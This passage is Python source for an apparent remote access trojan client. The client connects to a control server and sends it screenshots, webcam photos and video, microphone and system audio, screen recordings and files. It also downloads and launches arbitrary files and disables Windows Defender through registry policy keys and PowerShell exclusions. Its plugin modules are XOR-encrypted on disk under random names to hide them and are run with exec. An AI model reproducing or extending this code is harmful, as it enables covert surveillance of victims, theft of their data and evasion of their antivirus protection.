            os.remove(temp_path)
            send_response(conn, "❌ Image too small")
            return

        error = send_file(conn, temp_path)
        
        send_response(conn, error or f"✅ Photo from camera {camera_index} sent")
        
    except Exception as e:
        send_response(conn, f"❌ Photo (Critical Error): {str(e)}")
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except Exception as e:
                logger.error(f"Failed to delete temporary file: {e}")

# ====== Auto (Runs in a separate thread) ======
def auto_job(interval, capture_screen, capture_webcam, camera_index):
    # This function runs in a separate thread
    while not stop_event.wait(interval):
        try:
            # The socket must be writable only by this thread
            conn = current_socket 
            if conn and conn.fileno() != -1:
                if capture_screen:
                    #We call functions that themselves process the socket via socket_lock
                    cmd_screenshot("", conn)
                if capture_webcam:
                    cmd_photo(str(camera_index), conn)
        except Exception as e:
            logger.error(f"Auto Error: {e}")
            time.sleep(1)

def cmd_auto(args, conn):
    global auto_thread
    logger.debug(f"Executing /auto with arguments: {args}")
    try:
        parts = args.split()
        if not parts:
            return "❌ /auto <sec> [screen|webcam|both] [camera_index]"
        
        interval = float(parts[0])
        if interval <= 0:
            return "❌ Interval > 0"
        # mode: screen /webcam /both
        mode = parts[1].lower() if len(parts) > 1 else "both"
        capture_screen = "screen" in mode or "both" in mode
        capture_webcam = "webcam" in mode or "both" in mode

        # camera index (if any)
        camera_index = 0
        if len(parts) > 2:
            if parts[2].isdigit():
                camera_index = int(parts[2])
            else:
                return "❌ The camera index must be a number."

        if auto_thread and auto_thread.is_alive():
            return "❌ Already running (/stop)"

        stop_event.clear()
        auto_thread = threading.Thread(
            target=auto_job,
            args=(interval, capture_screen, capture_webcam, camera_index),
            daemon=True
        )
        auto_thread.start()
        return f"✅ Auto every {interval}s (camera {camera_index})"

    except Exception as e:
        return f"❌ {str(e)}"

def cmd_stop(args):
    global auto_thread
    if auto_thread and auto_thread.is_alive():
        stop_event.set()
        auto_thread.join(timeout=5)
        auto_thread = None
        return "✅ Auto stopped"
    return "❌ Auto not running"

# ====== Commands for recording (Audio-Video recording) ======

def cmd_mic(args, conn):
    """
    Records audio for a specified duration and sends the WAV file.
    Usage: /mic [seconds] (Default 5s, Max 30s)
    """
    logger.debug(f"Executing /mic with arguments: {args}")
    WAVE_OUTPUT_FILENAME = None
    
    try:
        record_time = 5
        if args.strip().isdigit():
            # Limit recording time to 1-30 seconds
            record_time = max(1, min(30, int(args.strip()))) 

        #1. Settings
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1 # We use 1 channel for better compatibility
        RATE = 44100
        
        temp_dir = tempfile.gettempdir()
        WAVE_OUTPUT_FILENAME = os.path.join(temp_dir, f"mic_rec_{int(time.time())}.wav")

        p = pyaudio.PyAudio()
        send_response(conn, f"✅ Started audio recording for {record_time} seconds...")

        # 2. Recording
        stream = p.open(format=FORMAT,
                         channels=CHANNELS,
                         rate=RATE,
                         input=True,
                         frames_per_buffer=CHUNK)

        frames = []
        num_frames = int(RATE / CHUNK * record_time)
        
        for i in range(0, num_frames):
            # exception_on_overflow=False prevents a buffer overflow crash
            data = stream.read(CHUNK, exception_on_overflow=False) 
            frames.append(data)

        #3. Stop
        stream.stop_stream()
        stream.close()
        p.terminate()

        #4. Save to WAV
        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            
        #5. Dispatch
        error = send_file(conn, WAVE_OUTPUT_FILENAME)
        send_response(conn, error or f"✅ Audio sent ({record_time}s)")

    except Exception as e:
        send_response(conn, f"❌ Microphone (Critical Error): {str(e)}")
    finally:
        if WAVE_OUTPUT_FILENAME and os.path.exists(WAVE_OUTPUT_FILENAME):
            os.remove(WAVE_OUTPUT_FILENAME)


def find_wasapi_device():
    """
    Finds the most suitable WASAPI device for Loopback recording.
    Tries: 1) Default OUTPUT, 2) Default INPUT, 3) Any WASAPI input.
    Returns (index, default_samplerate, max_input_channels) or None.
    """
    
    api_list = sd.query_hostapis()
    wasapi_index = None
    for i, api in enumerate(api_list):
        if api["name"].lower().startswith("windows wasapi"):
            wasapi_index = i
            break

    if wasapi_index is None:
        return None 

    # ---Helper function for checking and returning ---
    def check_and_return(device_index):
        if device_index is None:
            return None
        try:
            dev = sd.query_devices(device_index)
            if dev["hostapi"] == wasapi_index and dev["max_input_channels"] > 0:
                # RETURN THREE VALUES: index, frequency, channels
                return dev["index"], dev["default_samplerate"], dev["max_input_channels"] 
        except Exception:
            pass
        return None

    # ---Attempt 1: Default EXIT ---
    try:
        default_output_index = sd.default.device[1] 
        result = check_and_return(default_output_index)
        if result:
            return result
    except Exception:
        pass

    # ---Attempt 2: Default LOGIN ---
    try:
        default_input_index = sd.default.device[0] 
        result = check_and_return(default_input_index)
        if result:
            return result
    except Exception:
        pass
        
    # ---Attempt 3: Any WASAPI device ---
    for dev in sd.query_devices():
        if dev["hostapi"] == wasapi_index:
            if dev["max_input_channels"] > 0:
                return dev["index"], dev["default_samplerate"], dev["max_input_channels"]

    return None


def cmd_audiorecord(args, conn):
    """
    /recordaudio <seconds>
    Records system audio (WASAPI loopback) and sends a WAV file.
    
    Limit: 1–60 seconds.
    """

    logger.debug(f"Executes /recordaudio with arguments: {args}")

    # 💡 Initialize the container for device parameters.
    audio_path = None
    device_params = {}  
    # Initialize the variables that will be used
    samplerate = 44100
    channels_to_use = 2 
    dtype = 'int16'
    
    # ------------------------------------------------------------------
    # Assign default values that will be overwritten
    device_params['index'] = None
    device_params['samplerate'] = samplerate
    device_params['max_input_channels'] = channels_to_use 
    # ------------------------------------------------------------------

    try:
        # ----Arguments ----
        if not args.strip().isdigit():
            send_response(conn, "❌ Format: /recordaudio <seconds>")
            return

        duration = max(1, min(60, int(args.strip())))
        
        # ----------------------------------------------------------
        # 1. Search for WASAPI loopback device
        # ----------------------------------------------------------
        # Let's assume that find_wasapi_device now returns 3 values!
        device_info = find_wasapi_device() 

        if device_info is None:
            send_response(conn,
                "❌ System audio cannot be recorded: WASAPI loopback device not found.\n"
                "Requires Windows and an active audio device that supports Loopback."
            )
            return

        # 💡 SAVE AND UNPACK THREE VALUES:
        device_params['index'] = device_info[0]
        device_params['samplerate'] = device_info[1]
        device_params['max_input_channels'] = device_info[2] 
        
        # We adapt the channels: we use 2 channels, BUT no more than the device allows.
        channels_to_use = min(2, device_params['max_input_channels'])
        samplerate = device_params['samplerate'] # Use a local variable for brevity in calculations

        # ----------------------------------------------------------
        #2. File path
        # ----------------------------------------------------------
        temp_dir = tempfile.gettempdir()
        audio_path = os.path.join(temp_dir, f"audio_{int(time.time())}.wav")

        send_response(conn, f"🎧 Record system audio for {duration} seconds (Frequency: {samplerate} Hz, Channels: {channels_to_use})...")

        # ----------------------------------------------------------
        #3. Record 
        # ----------------------------------------------------------
        
        # Install the device by accessing the container
        sd.default.device = device_params['index']  
        sd.default.dtype = dtype

        recording = sd.rec(
            int(duration * samplerate),
            samplerate=samplerate,
            channels=channels_to_use, # <--USING ADAPTIVE CHANNELS
            dtype=dtype,
            blocking=False
        )

        sd.wait() # Waiting for the recording to complete

        # ----------------------------------------------------------
        #4. Saving WAV
        # ----------------------------------------------------------
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(channels_to_use) # <--USING ADAPTIVE CHANNELS
            wf.setsampwidth(2)   # int16 → 2 bytes
            wf.setframerate(samplerate)
            wf.writeframes(recording.tobytes())

        # ----------------------------------------------------------
        #5. Sending a file
        # ----------------------------------------------------------
        err = send_file(conn, audio_path)
        send_response(conn, err or "✅ System sound sent")

    except Exception as e:
        send_response(conn, f"❌ Audio recording error: {str(e)}")

    finally:
        if audio_path and os.path.exists(audio_path):
            try:
                os.remove(audio_path)
            except Exception:
                pass


def cmd_webcam_video(args, conn):
    """
    Records video from a specified webcam for a duration.
    Usage: /webcam <index> <seconds> (Max 30s)
    """
    logger.debug(f"Executes /webcam with arguments: {args}")
    output_file = None
    
    try:
        parts = args.strip().split()
        if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
            send_response(conn, "❌ Format: /webcam <index> <seconds>")
            return
            
        camera_index = int(parts[0])
        record_time = max(1, min(30, int(parts[1]))) # Limit 30s

        # 1. Initialization
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            send_response(conn, f"❌ Camera with index {camera_index} is not available.")
            return

        # Get the actual frame sizes (for VideoWriter)
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        # 2. Setup VideoWriter
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, f"webcam_vid_{int(time.time())}.avi")
        
        # Use .avi for XVID
        output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (frame_width, frame_height)) 

        send_response(conn, f"✅ Started recording video from camera {camera_index} for {record_time} seconds...")
        
        #3. Record
        start_time = time.time()
        
        while time.time() - start_time < record_time:
            ret, frame = cap.read()
            if ret:
                output_v.write(frame)
            else:
                time.sleep(0.05) 
                
        #4. Free up resources
        cap.release()
        output_v.release()
        
        #5. Dispatch
        error = send_file(conn, output_file)
        send_response(conn, error or f"✅Video ({record_time}s) sent")

    except Exception as e:
        send_response(conn, f"❌ Webcam video: {str(e)}")
    finally:
        if output_file and os.path.exists(output_file):
            os.remove(output_file)


def cmd_screenrecord(args, conn):
    """
    Records screen video for a specified duration and sends the MP4 file using MSS.
    Usage: /screenrecord <seconds> (Max 60s)
    """
    logger.debug(f"Executes /screenrecord with arguments: {args}")
    output_file = None

    try:
        if not args.strip().isdigit():
            send_response(conn, "❌Format: /screenrecord <seconds>")
            return

        record_time = max(1, min(60, int(args.strip())))
        FPS = 10.0
        frame_interval = 1.0 / FPS

        # Initialization MSS
        sct = mss.mss()

        # Screen sizes
        monitor = sct.monitors[1]  # main monitor
        screen_width = monitor["width"]
        screen_height = monitor["height"]

        # Preparing a video file (MP4)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, f"screen_rec_{int(time.time())}.mkv")

        output_video = cv2.VideoWriter(output_file, fourcc, FPS, (screen_width, screen_height))

        send_response(conn, f"🎥 Screen recording started for {record_time} seconds...")

        num_frames = int(record_time * FPS)

        for i in range(num_frames):
            t0 = time.time()
        
            # capture frame
            frame_raw = sct.grab(monitor)
            frame = np.array(frame_raw)[..., :3]  # remove alpha channel
            output_video.write(frame)
        
            # pause until next frame
            elapsed = time.time() - t0
            time.sleep(max(0, frame_interval - elapsed))


        output_video.release()

        error = send_file(conn, output_file)
        send_response(conn, error or f"✅ Screen recording ({record_time}s) sent")

    except Exception as e:
        send_response(conn, f"❌ Critical Error entries: {str(e)}")

    finally:
        if output_file and os.path.exists(output_file):
            os.remove(output_file)


# ====== Download (Runs in a separate thread) ======
def cmd_download(args, conn):
    logger.debug(f"Executes /download with arguments: {args}")
    try:
        file_path = os.path.normpath(os.path.join(current_path, args.strip()))
        if not os.path.isfile(file_path):
            send_response(conn, "❌ File not found")
            return None
        if os.path.getsize(file_path) > 50 * 1024 * 1024:
            send_response(conn, "❌ >50MB")
            return None
            
        error = send_file(conn, file_path)
        send_response(conn, error or "✅ File sent")
        return None
    except Exception as e:
        send_response(conn, f"❌ Download: {str(e)}")
        return None


def cmd_download_link(args: str):
    """
    Downloads a file from a link in a separate thread.
    The main loop does NOT send a response (return None).
    """
    # ---get the current socket ---
    with socket_lock:
        conn = current_socket

    if not conn:
        return "Error: no active connection."

    def _worker():
        def _send(msg: str):
            send_response(conn, msg, cmd_name="/download_link")

        save_path = None

        try:
            parts = args.strip().split()
            if not parts:
                _send("Error: provide a link.")
                return

            link = parts[0]
            download_only = len(parts) > 1 and parts[1] == "0"

            # ----------loading ----------
            resp = requests.get(link, stream=True, timeout=120)
            resp.raise_for_status()

            filename = (
                os.path.basename(link.split("?", 1)[0])
                or f"dl_{int(time.time())}.bin"
            )
            save_path = os.path.join(current_path, filename)

            with file_lock:
                with open(save_path, "wb") as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)

            # ----------launch (if needed) ----------
            if not download_only:
                if os.name == "nt":
                    os.startfile(save_path)
                else:
                    subprocess.Popen(["xdg-open", save_path])

            _send(
                f"File uploaded: `{filename}`"
                + ("" if download_only else " and launched")
            )

        except requests.Timeout:
            _send("Error: loading timeout.")
        except requests.RequestException as e:
            _send(f"Error downloads: {e}")
        except Exception as e:
            _send(f"Error: unknown Error: {e}")
        finally:
            # clean up undownloaded file
            try:
                if save_path and os.path.exists(save_path):
                    pass  # the file is valid, we do nothing
            except Exception:
                pass

    threading.Thread(
        target=_worker,
        daemon=True,
    ).start()

    return None


# ==== Important commands for jamming Win def ========
def cmd_wd_exclude(args):
    """
    Adds the current exe or the specified path to Windows Defender exceptions.
    """
    try:
        path_arg = args.strip().strip('"\'')
        
        # 1. Determine the target path
        if not path_arg:
            target_path = sys.executable
            logger.info("Add the current exe to the exceptions")
        else:
            target_path = path_arg if os.path.isabs(path_arg) else os.path.join(current_path, path_arg)
            target_path = os.path.abspath(target_path)
            logger.info(f"Adding a path: {target_path}")

        #2: Existence check
        if not os.path.exists(target_path):
            return f"❌ The path does not exist: `{target_path}`"

        #3: Escaping for PowerShell
        escaped = target_path.replace('"', '`"')

        # PowerShell command
        ps_cmd = (
            f'Try {{ Add-MpPreference -ExclusionPath "{escaped}"; "OK" }} '
            f'Catch {{ $_.Exception.Message }}'
        )

        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        output = (result.stdout + result.stderr).strip().upper()
        if "OK" in output or "ALREADY" in output:
            return f"✅ Added to Defender exceptionsr: `{os.path.basename(target_path)}`"

        # === Reserve via registry ===
        try:
            key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
            with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
                reg.SetValueEx(key, target_path, 0, reg.REG_DWORD, 0)
            return f"✅ Added via registry: `{os.path.basename(target_path)}`"
        except PermissionError:
            logger.warning("No rights to write to the registry")
        except Exception as e:
            logger.warning(f"Failed to add via registry: {e}")

        return f"❌ Failed to add. PowerShell answer: {output[:500]}"

    except Exception as e:
        logger.error(f"Error wd_exclude: {e}")
        return f"❌ Critical Error: {e}"


def cmd_killwindef(args):
    """
    Disables Windows Defender (включая Real-Time Protection) через реестр.
    """
    try:
        logger.info("Выполняется отключение Windows Defender через реестр...")

        # Open/create keys with write permission
        key1 = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, 
                               r"SOFTWARE\Policies\Microsoft\Windows Defender", 
                               0, reg.KEY_SET_VALUE)
        key2 = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, 
                               r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 
                               0, reg.KEY_SET_VALUE)

        # === Defender main key ===
        reg.SetValueEx(key1, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
        # Additionally (just in case they suddenly turn it back on)
        reg.SetValueEx(key1, "AllowFastServiceStartup", 0, reg.REG_DWORD, 0)
        reg.SetValueEx(key1, "ServiceKeepAlive", 0, reg.REG_DWORD, 0)

        # === Real-Time Protection ===
        reg.SetValueEx(key2, "DisableBehaviorMonitoring", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key2, "DisableOnAccessProtection", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key2, "DisableScanOnRealtimeEnable", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key2, "DisableIOAVProtection", 0, reg.REG_DWORD, 1)
        # Disable cloud protection and automatic sending of samples
        reg.SetValueEx(key2, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)

        # Closing the keys
        reg.CloseKey(key1)
        reg.CloseKey(key2)

        logger.info("Windows Defender successfully disabled through the registry")
        return "Windows Defender and Real-Time Protection are disabled"

    except PermissionError:
        return "Error: not enough rights"
    except Exception as e:
        logger.error(f"Error when disconnected Defender: {e}")
        return f"Error Shutdowns Defender: {str(e)}"


# ====== Upload (Handles buffer and file reception) ======
# Leave drain_socket to clear the socket of garbage
def drain_socket(conn, bytes_to_drain):
    try:
        conn.settimeout(5)
        drained = 0
        while drained < bytes_to_drain:
            chunk = conn.recv(min(8192, bytes_to_drain - drained))
            if not chunk:
                break
            drained += len(chunk)
    except:
        pass
    finally:
        conn.settimeout(None)


def cmd_upload(payload, conn, initial_data=b''):
    """
    Handles the /upload command: reads file metadata and body
    from the socket and writes the file to disk.
    """
    global current_path # Make sure current_path is defined globally
    logger.debug(f"Upload: {len(initial_data)} initial bytes")
    
    save_path = None
    file_size = 0  # Initialize for the except block
    received = 0   # Initialize for the except block
    
    try:
        file_name = payload.get("file_name")
        file_size = int(payload.get("file_size", 0))
        
        # 1. Validation
        if not file_name or file_size <= 0 or file_size > 50 * 1024 * 1024:
            # If the name is missing or incorrect, clear the socket
            drain_socket(conn, file_size - len(initial_data))
            return "❌ Invalid metadata (file name or size)"
            
        #2. Shaping the path
        # 💥 THIS PROVIDES RENAME: The file_name sent by the server is used
        save_path = os.path.join(current_path, file_name)
        
        if os.path.exists(save_path):
            # If the file already exists, you need to clear the socket of data so as not to freeze
            drain_socket(conn, file_size - len(initial_data))
            return "❌ The file exists"
            
        #3. Reading and writing a file
        received = len(initial_data)
        conn.settimeout(60) # Increase timeout for large files
        
        # File_lock is assumed to be threading.Lock()
        with file_lock:
            with open(save_path, 'wb') as f:
                if initial_data:
                    f.write(initial_data)
                
                while received < file_size:
                    # Read the remaining data
                    chunk = conn.recv(min(8192, file_size - received))
                    if not chunk:
                        raise ConnectionError("Gap")
                    f.write(chunk)
                    received += len(chunk)
        
        conn.settimeout(None) # Reset timeout
        
        #4. Completeness check and final report
        if received != file_size:
            # If not everything is accepted, delete the file
            if os.path.exists(save_path):
                os.remove(save_path)
            return f"❌ Incomplete ({received}/{file_size})"
            
        return f"✅ {file_name} Loaded ({received}B)"
        
    except Exception as e:
        # In case of an error, we try to clear the socket of the remaining file data
        try:
            # Use max(0, ...) to safely calculate the remaining bytes
            bytes_to_drain = max(0, file_size - received - len(initial_data))
            drain_socket(conn, bytes_to_drain)
        except:
            pass
            
        # Delete the unfinished file
        if save_path and os.path.exists(save_path):
            os.remove(save_path)
            
        return f"❌ Upload: {str(e)}"


# ====== Work of plugins/control panel ======

def cmd_plugins_panel(args=None, conn=None):
    load_plugins() 
    if not MODULES_METADATA:
        return "📂 *Module list is empty.*"

    # Header without code block
    report = "🛠 *Module Manager*\n\n"
    
    for filename, info in MODULES_METADATA.items():
        # Status with beautiful icons
        status = "🟢 `ON`" if info['active'] else "🔴 `OFF`"
        
        # Form a module card
        report += f"{status} *{info['real_name'].upper()}*\n"
        report += f"ID: `{filename}`\n"
        report += f"ℹ️ {info['description']}\n\n"
    
    report += "─── *Management* ───\n"
    report += "• `/pl_on <ID>` — Turn on\n"
    report += "• `/pl_off <ID>` — Turn off\n"
    report += "• `/pl_rm <ID>` — Remove\n"
    report += "• `/pl_upd` — Rescan disk"

    return report


def cmd_plugin_control(args, conn=None):
    if not args: return "⚠️ Use: `/pl_off id.dat`"
    
    parts = args.split()
    if len(parts) < 2: return "⚠️ Invalid Format."
    
    action, plugin_id = parts[0].lower(), parts[1]
    disabled = get_disabled_list()
    
    msg = ""
    if action == "off":
        if plugin_id not in disabled:
            disabled.append(plugin_id)
            save_disabled_list(disabled)
            msg = f"🚫 Plugin `{plugin_id}` is deactivated."
    
    elif action == "on":
        if plugin_id in disabled:
            disabled.remove(plugin_id)
            save_disabled_list(disabled)
            msg = f"✅ Plugin `{plugin_id}` is activated."
            
    elif action == "rm":
        path = os.path.join(os.getenv('APPDATA'), 'SystemData', 'modules', plugin_id)
        if os.path.exists(path):
            os.remove(path)
            if plugin_id in disabled:
                disabled.remove(plugin_id)
                save_disabled_list(disabled)
            msg = f"🗑The module `{plugin_id}` has been removed."
        else:
            msg = "❌ File not found."

    # MOST IMPORTANT: Immediately update the registry of commands in memory
    load_plugins()
    return msg if msg else "❓ Unknown action."


def cmd_install_lib(args, conn=None):
    """
    Downloads a ZIP with a library and unpacks it into /libs/
    Usage: /install_lib <URL_TO_ZIP>
    """
    if not args:
        return "⚠️ Provide a direct link to the zip. Example: /install_lib http://site.com/lib.zip"
    
    url = args.strip()
    libs_dir = os.path.join(os.getenv('APPDATA'), 'SystemData', 'libs')
    
    send_response(conn, f"⏳ Downloading the library from {url}...")
    
    try:
        # 1. Download the archive into memory
        r = requests.get(url, stream=True)
        if r.status_code != 200:
            return f"❌ Error HTTP: {r.status_code}"
            
        # 2. We unpack
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(libs_dir)
            
        # 3. Forcefully update paths (just in case)
        if libs_dir not in sys.path:
            sys.path.insert(0, libs_dir)
            
        return f"✅ The library is installed in {libs_dir}. \nNow plugins can do import."
        
    except Exception as e:
        return f"❌ Error Settings: {e}"


def setup_libs_path():
    """Setting up a library folder using the site module"""
    sys_dir = os.path.join(os.getenv('APPDATA'), 'SystemData')
    libs_dir = os.path.join(sys_dir, 'libs')
    
    if not os.path.exists(libs_dir):
        try:
            os.makedirs(libs_dir)
        except: pass
        
    # Using site.addsitedir is the correct way to add library folders.
    # This doesn't just add the path to sys.path, it also handles .pth files 
    # and configures packages correctly.
    if os.path.exists(libs_dir):
        site.addsitedir(libs_dir)
        if libs_dir not in sys.path:
            sys.path.insert(0, libs_dir)
        logger.info(f"📚 Libraries are connected via addsitedir: {libs_dir}")


def cmd_plugins_reload(args=None):
    """Command for manually updating the list of plugins and encrypting them"""
    try:
        # Call our main loading logic
        # (which we updated last time)
        load_plugins() 
        
        # We count how many commands are currently in the registry for the report
        count = len(COMMANDS_REGISTRY)
        return f"♻️ The registry has been updated. Total commands available: {count}. New modules are encrypted and active."
    except Exception as e:
        logger.error(f"Error when reloading plugins: {e}")
        return f"❌ Error when updating plugins: {str(e)}"


def load_plugins():
    """Оmain loader: encrypts .py, masks names and loads .dat"""
    global COMMANDS_REGISTRY, MODULES_METADATA
    
    #1. Completely clean the registry before booting. 
    # We take a clean copy of CORE_COMMANDS to "forget" the old plugin commands.
    COMMANDS_REGISTRY.clear()
    COMMANDS_REGISTRY.update(CORE_COMMANDS)
    
    # Clear metadata for the control panel
    MODULES_METADATA = {}
    
    plugins_dir = os.path.join(os.getenv('APPDATA'), 'SystemData', 'modules')
    if not os.path.exists(plugins_dir):
        os.makedirs(plugins_dir)
        return

    # Get the current list of disabled IDs
    disabled_plugins = get_disabled_list()

    for file in os.listdir(plugins_dir):
        path = os.path.join(plugins_dir, file)
        
        try:
            # ---UNIT 1: PROCESSING .py SOURCE ---
            if file.endswith(".py"):
                try:
                    # Read the source code
                    with open(path, 'r', encoding='utf-8-sig', errors='ignore') as f:
                        code = f.read()
                    
                    if not code.strip():
                        logger.error(f"⚠️ File {file} is empty or cannot be read.")
                        continue
            
                    # Encrypt the code for masking on the disk
                    encrypted_data = XOR_cipher(code.encode('utf-8', 'ignore'))
                    new_name = get_random_name() # Generate a random name (for example, a1b2c3d4e5.dat)
                    new_path = os.path.join(plugins_dir, new_name)
                    
                    with open(new_path, "wb") as f:
                        f.write(encrypted_data)
                    
                    # Delete the original .py after encryption
                    os.remove(path)
                    logger.info(f"🔒Module {file} encrypted as {new_name}")
                    
                    # Switch pointers to the new encrypted file for the current iteration
                    file = new_name
                    path = new_path
                    
                except Exception as e:
                    logger.error(f"❌ Critical Error when processing .py {file}: {e}")
                    continue

            # ---UNIT 2: LOADING AND EXECUTING .dat ---
            if file.endswith(".dat"):
                is_active = file not in disabled_plugins
                
                with open(path, "rb") as f:
                    encrypted_content = f.read()
                
                # Decrypt the code into memory
                decrypted_code = XOR_cipher(encrypted_content).decode('utf-8', 'ignore')
                
                # Parse "Passport" (Metadata) from the first 15 lines of code
                m_name = file # By default the name is the file ID
                m_desc = "No description"
                
                for line in decrypted_code.split('\n')[:15]:
                    if line.startswith("# NAME:"): 
                        m_name = line.replace("# NAME:", "").strip()
                    if line.startswith("# DESC:"): 
                        m_desc = line.replace("# DESC:", "").strip()

                # Save information for the control panel /plugins
                MODULES_METADATA[file] = {
                    "real_name": m_name, 
                    "description": m_desc,
                    "active": is_active
                }

                # If the plugin is not blacklisted, create a module and register commands
                if is_active:
                    # Create a virtual module object
                    new_mod = types.ModuleType(file.replace(".dat", ""))
                    
                    # Add the client environment (libraries and functions) to the module
                    new_mod.__dict__.update({
                        "os": os, 
                        "sys": sys, 
                        "time": time,
                        "threading": threading,
                        "subprocess": subprocess,
                        "socket": socket,
                        "json": json,
                        "shutil": shutil,
                        "logger": logger,
                        "requests": requests,
                        "pyautogui": pyautogui,
                        "mss": mss,
                        "cv2": cv2,
                        "np": np,
                        "pyperclip": pyperclip,
                        "psutil": psutil,
                        "send_response": send_response, 
                        "send_file": send_file,
                        "COMMANDS_REGISTRY": COMMANDS_REGISTRY,
                        "cmd_upload": cmd_upload,
                        "XOR_cipher": XOR_cipher
                    })
                    
                    # Execute the plugin code in the context of the created module
                    exec(decrypted_code, new_mod.__dict__)
                    
                    # If the plugin has a PLUGINS dictionary, add it to the main registry
                    if hasattr(new_mod, "PLUGINS"):
                        COMMANDS_REGISTRY.update(new_mod.PLUGINS)
                        
        except Exception as e:
            logger.error(f"❌ Errorin a moduleе {file}: {e}")


# ====== Command dictionary ======
CORE_COMMANDS = {
    "/ls": cmd_ls,
    "/cd": cmd_cd,
    "/back": cmd_back,
    "/pwd": cmd_pwd,
    "/mkdir": cmd_mkdir,
    "/delete": cmd_delete,
    "/rename": cmd_rename,
    "/copy": cmd_copy,
    "/run": cmd_run,
    "/move": cmd_move,
    "/msg": cmd_msg,
    "/wallpaper": cmd_wallpaper,
    "/applist": cmd_applist,
    "/applist_title":cmd_applist_title,
    "/applist_close": cmd_applist_close,
    "/volumeplus": cmd_volumeplus,
    "/volumeminus": cmd_volumeminus,
    "/download_link": cmd_download_link,
    "/sysinfo": cmd_sysinfo,
    "/execute": cmd_execute,
    "/ex": cmd_execute,
    "/changeclipboard": cmd_changeclipboard,
    "/minimize": cmd_minimize,
    "/maximize": cmd_maximize,
    "/version": cmd_version,
    "/cmdbomb": cmd_cmdbomb,
    "/altf4": cmd_altf4,
    "/restart": cmd_restart, 
    "/mousemove": cmd_mousemove,
    "/mouseclick": cmd_mouseclick,
    "/playsound": cmd_playsound,
    "/stopsound": cmd_stopsound,
    "/mousemesstop": cmd_mousemesstop,
    "/block": cmd_block,
    "/unblock": cmd_unblock,
    "/clipboard": cmd_getclipboard,
    "/keytype": cmd_keytype,
    "/ping": cmd_ping,  
    "/mic": cmd_mic,            
    "/webcam": cmd_webcam_video, 
    "/open_image": cmd_open_image,
    "/screenrecord": cmd_screenrecord,
    "/location": cmd_location,
    "/mousemesstart": cmd_mousemesstart,
    "/tasklist": cmd_tasklist,   
    "/taskkill": cmd_taskkill,   
    "/keypress": cmd_keypress,
    "/holdkey": cmd_holdkey, 
    "/screenshot": cmd_screenshot,
    "/sc": cmd_screenshot,
    "/photo": cmd_photo,
    "/auto": cmd_auto,
    "/stop": cmd_stop,
    "/download": cmd_download,
    "/upload": cmd_upload,
    "/update": cmd_update,
    "/killwindef": cmd_killwindef,
    "/wd_exclude": cmd_wd_exclude,
    "/audiorecord": cmd_audiorecord,
    "/open_video": cmd_open_video,
    "/close_video": cmd_close_video,
    "/screenshot_full": cmd_screenshot_full,
    "/scfull": cmd_screenshot_full,
    "/grant": cmd_grant,
    "/whereami": cmd_whereami,
    "/plugins_reload": cmd_plugins_reload,
    "/pl_upd": cmd_plugins_reload, # Alias
    "/plugins": cmd_plugins_panel,
    "/pl_on": lambda a, c=None: cmd_plugin_control(f"on {a}", c),
    "/pl_off": lambda a, c=None: cmd_plugin_control(f"off {a}", c),
    "/pl_rm": lambda a, c=None: cmd_plugin_control(f"rm {a}", c),
    "/install_lib": cmd_install_lib
}

COMMANDS_REGISTRY = CORE_COMMANDS.copy()

# ====== Main loop ======
def main_client_loop():
    global current_socket
    
    load_plugins()

    try:
        # Set the working directory to the folder where the executable file is located
        os.chdir(os.path.dirname(os.path.abspath(sys.executable)))
    except Exception as e:
        logger.error(f"Failed to set working directory: {e}")

    while True:
        conn = None
        buffer = b''
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            enable_aggressive_keepalive(conn)
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            conn.connect((SERVER_IP, SERVER_PORT))
            logger.info("Подключено")
            
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                is_admin = False
            
            sys_info = {
                "os": f"Win {platform.release()}", # For example "Win 10"
                "user": os.getenv('USERNAME', 'User'),
                "is_admin": is_admin
            }

            #2. Send an extended handshake
            handshake_data = {
                "client_id": CLIENT_ID,
                "info": sys_info # Put the information inside
            }
            handshake = json.dumps(handshake_data, ensure_ascii=False).encode('utf-8') + b'\n'
            # === END OF CHANGES ===
            
            conn.sendall(handshake)

            try:
                cmd_screenshot("", conn)
                #cmd_location("", conn)
            except Exception as e:
                logger.error(f"Error Autostart: {e}")

            # Update the global socket for use in auto_job and send_file
            with socket_lock:
                current_socket = conn

            hb_stop_event.clear()
            hb_thread = threading.Thread(target=client_heartbeat_loop, daemon=True)
